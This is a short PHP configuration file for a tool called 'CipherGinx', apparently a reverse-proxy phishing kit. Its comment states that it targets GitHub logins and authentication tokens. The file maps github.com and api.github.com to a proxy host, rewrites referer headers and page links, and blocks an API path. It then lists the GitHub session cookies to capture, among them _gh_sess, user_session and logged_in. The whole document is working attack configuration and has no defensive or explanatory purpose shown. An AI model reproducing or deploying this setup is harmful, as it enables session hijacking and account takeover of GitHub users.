<?php
// CipherGinx PHP - GitHub Phishing Configuration
// Targets GitHub login and authentication tokens

return [
    'hostname' => 'github.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['github.com', 'localhost'],
        ['api.github.com', 'api.localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
        ['/session', ['Referer' => 'https://localhost/login']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://github.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/api/v3/user/installations',
    ],

    'get_cookie' => [
        '_gh_sess',
        'logged_in',
        'user_session',
        'dotcom_user',
        '_octo',
        'tz',
    ],
];
